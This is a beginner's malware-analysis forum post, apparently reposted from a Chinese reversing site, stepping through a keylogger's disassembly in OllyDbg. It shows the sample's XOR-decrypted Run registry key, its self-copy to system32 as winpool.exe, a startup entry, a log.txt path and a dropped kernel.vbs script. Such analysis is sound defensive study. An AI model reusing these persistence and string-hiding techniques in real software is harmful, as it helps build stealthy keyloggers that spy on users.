
# 菜鸟的第一份病毒分析报告，欢迎拍砖

> 原文：[`www.pediy.com/kssd/pediy12/144462.html`](https://www.pediy.com/kssd/pediy12/144462.html)

菜鸟的第一份病毒分析报告，样本很简单，欢迎各位大虾小虾们拍砖，多多指教![](img/d23858dd221cce728a3a61b46badb044.jpg "恐怖!")！![](img/906f120cfe711ccbc8463fd6eb86eee9.jpg "尴尬")

## 用 OD 加载病毒

```
00401000  >/$  B8 60324000   mov     eax, Keylog.00403260     ;  ASCII "UI@RQGTCZKoetiui\rZQohbiquZEsttchrPctuoihZTsh"

            这是被加密的字符串

00401005  |.  33C9          xor     ecx, ecx
00401007  |.  B9 2E000000   mov     ecx, 2E
0040100C  |.  49            dec     ecx
0040100D  |>  8A18          /mov    bl, byte ptr ds:[eax]  从这里开始对字符串解密
0040100F  |.  80F3 06       |xor    bl, 6
00401012  |.  8818          |mov    byte ptr ds:[eax], bl
00401014  |.  40            |inc    eax
00401015  |.^ E2 F6         \loopd  short Keylog.0040100D  字符串解密结束"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

接下来是一系列 API 的调用：

### 首先获取 Windows 系统文件目录完整路径

```
00401017  |.  6A 64         push    64                         ; /BufSize = 64 (100.)
00401019  |.  68 003B4000   push    Keylog.00403B00            ; |Buffer = Keylog.00403B00
0040101E  |.  E8 8B050000   call    <jmp.&kernel32.GetSystem>; \GetSystemDirectoryA
```

### 设置 `kernel.vbs` 的存放路径

```
00401023  |.  68 4E384000   push    Keylog.0040384E            ; /StringToAdd = "\kernel.vbs"
00401028  |.  68 003B4000   push    Keylog.00403B00            ; |ConcatString = "C:\WINDOWS\system32"
0040102D  |.  E8 9A050000   call    <jmp.&kernel32.lstrcatA> ; \lstrcatA

00401032  |.  68 5A384000   push    Keylog.0040385A            ; /StringToAdd = "cscript "
00401037  |.  68 A3324000   push    Keylog.004032A3            ; |ConcatString = "C:\WINDOWS\system32\kernel.vbs"
0040103C  |.  E8 8B050000   call    <jmp.&kernel32.lstrcatA> ; \lstrcatA

00401041  |.  68 003B4000   push    Keylog.00403B00            ; /StringToAdd = "C:\WINDOWS\system32\kernel.vbs"
00401046  |.  68 A3324000   push    Keylog.004032A3            ; |ConcatString = "cscript C:\WINDOWS\system32\kernel.vbs"
0040104B  |.  E8 7C050000   call    <jmp.&kernel32.lstrcatA> ; \lstrcatA
```

### 打开注册表，注册表主键为 `HKEY_LOCAL_MACHINE`，子键即为刚才解密的字符串 `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

```
00401050  |.  68 02394000   push    Keylog.00403902            ; /pHandle = Keylog.00403902
00401055  |.  68 06000200   push    20006                      ; |Access = KEY_WRITE
0040105A  |.  6A 00         push    0                          ; |Reserved = 0
0040105C  |.  68 60324000   push    Keylog.00403260            ; |Subkey = "UI@RQGTCZKoetiui\rZQohbiquZEsttchrPctuoihZTsh"
00401061  |.  68 02000080   push    80000002                   ; |hKey = HKEY_LOCAL_MACHINE
00401066  |.  E8 73050000   call    <jmp.&advapi32.RegOpenKe>; \RegOpenKeyExA
```

### 获取病毒程序路径

```
0040106B  |.  68 00010000   push    100                        ; /BufSize = 100 (256.)
00401070  |.  68 06394000   push    Keylog.00403906            ; |PathBuffer = Keylog.00403906
00401075  |.  6A 00         push    0                          ; |hModule = NULL
00401077  |.  E8 26050000   call    <jmp.&kernel32.GetModule>; \GetModuleFileNameA
```

### 获取 Windows 系统文件目录完整路径 `C:\WINDOWS\system32`

```
0040107C  |.  6A 64         push    64                         ; /BufSize = 64 (100.)
0040107E  |.  68 383A4000   push    Keylog.00403A38            ; |Buffer = Keylog.00403A38
00401083  |.  E8 26050000   call    <jmp.&kernel32.GetSystem>; \GetSystemDirectoryA

00401088  |.  6A 64         push    64                         ; /BufSize = 64 (100.)
0040108A  |.  68 9C3A4000   push    Keylog.00403A9C            ; |Buffer = Keylog.00403A9C
0040108F  |.  E8 1A050000   call    <jmp.&kernel32.GetSystem>; \GetSystemDirectoryA
```

### 设置 `log.txt` 的存放路径

```
00401094  |.  68 63384000   push    Keylog.00403863            ; /StringToAdd = "\log.txt"
00401099  |.  68 9C3A4000   push    Keylog.00403A9C            ; |ConcatString = ""
0040109E  |.  E8 29050000   call    <jmp.&kernel32.lstrcatA> ; \lstrcatA
```

### 设置 `winpool.exe` 的存放路径 `C:\WINDOWS\system32\winpool.exe`

```
004010A3  |.  68 96324000   push    Keylog.00403296            ; /StringToAdd = "\winpool.exe"
004010A8  |.  68 383A4000   push    Keylog.00403A38            ; |ConcatString = ""
004010AD  |.  E8 1A050000   call    <jmp.&kernel32.lstrcatA> ; \lstrcatA
```

### 创建文件

```
004010B2  |.  6A 00         push    0                          ; /hTemplateFile = NULL
004010B4  |.  68 80000000   push    80                         ; |Attributes = NORMAL
004010B9  |.  6A 03         push    3                          ; |Mode = OPEN_EXISTING
004010BB  |.  6A 00         push    0                          ; |pSecurity = NULL
004010BD  |.  6A 00         push    0                          ; |ShareMode = 0
004010BF  |.  68 00000080   push    80000000                   ; |Access = GENERIC_READ
004010C4  |.  68 383A4000   push    Keylog.00403A38            ; |FileName = ""
004010C9  |.  E8 A4040000   call    <jmp.&kernel32.CreateFil>; \CreateFileA

004010CE  |.  83F8 FF       cmp     eax, -1
004010D1  |.  75 7F         jnz     short Keylog.00401152
```

如果创建失败，则复制病毒文件到目录`"C:\WINDOWS\system32\winpool.exe"`

```
004010D3  |.  6A 00         push    0                          ; /FailIfExists = FALSE
004010D5  |.  68 383A4000   push    Keylog.00403A38            ; |NewFileName = ""
004010DA  |.  68 06394000   push    Keylog.00403906            ; |ExistingFileName = ""
004010DF  |.  E8 88040000   call    <jmp.&kernel32.CopyFileA>; \CopyFileA
```

### 添加注册表启动项

```
004010E4  |.  6A 64         push    64                         ; /BufSize = 64 (100.)
004010E6  |.  68 383A4000   push    Keylog.00403A38            ; |Buffer = Keylog.00403A38
004010EB  |.  6A 01         push    1                          ; |ValueType = REG_SZ
004010ED  |.  6A 00         push    0                          ; |Reserved = 0
004010EF  |.  68 8E324000   push    Keylog.0040328E            ; |ValueName = "winpool"
004010F4  |.  FF35 02394000 push    dword ptr ds:[403902]      ; |hKey = 0
004010FA  |.  E8 E5040000   call    <jmp.&advapi32.RegSetVal>; \RegSetValueExA

004010FF  |.  FF35 02394000 push    dword ptr ds:[403902]      ; /hKey = NULL 释放该注册表键句柄
00401105  |.  E8 CE040000   call    <jmp.&advapi32.RegCloseK>; \RegCloseKey
```

### 创建文件`"C:\WINDOWS\system32\kernel.vbs"`

```
0040110A  |.  6A 00         push    0                          ; /hTemplateFile = NULL
0040110C  |.  68 80000000   push    80                         ; |Attributes = NORMAL
00401111  |.  6A 04         push    4                          ; |Mode = OPEN_ALWAYS
00401113  |.  6A 00         push    0                          ; |pSecurity = NULL
00401115  |.  6A 00         push    0                          ; |ShareMode = 0
00401117  |.  68 00000040   push    40000000                   ; |Access = GENERIC_WRITE
0040111C  |.  68 003B4000   push    Keylog.00403B00            ; |FileName = "C:\WINDOWS\system32\kernel.vbs"
00401121  |.  E8 4C040000   call    <jmp.&kernel32.CreateFil>; \CreateFileA

00401126  |.  A3 AE384000   mov     dword ptr ds:[4038AE], e>
```

### 往 `kernel.vbs` 脚本文件写入代码

```
0040112B  |.  6A 00         push    0                          ; /pOverlapped = NULL
0040112D  |.  68 643B4000   push    Keylog.00403B64            ; |pBytesWritten = Keylog.00403B64
00401132  |.  68 47050000   push    547                        ; |nBytesToWrite = 547 (1351.)
00401137  |.  68 07334000   push    Keylog.00403307            ; |Buffer = Keylog.00403307
0040113C  |.  FF35 AE384000 push    dword ptr ds:[4038AE]      ; |hFile = NULL
00401142  |.  E8 7F040000   call    <jmp.&kernel32.WriteFile>; \WriteFile      关闭内核对象

00401147  |.  FF35 AE384000 push    dword ptr ds:[4038AE]      ; /hObject = NULL
0040114D  |.  E8 14040000   call    <jmp.&kernel32.CloseHand>; \CloseHandle
```

如果`"winpool.exe"`创建成功则创建互斥进行，进程名为`"winpool"`

```
00401152  |>  C705 643B4000>mov     dword ptr ds:[403B64], 0
```
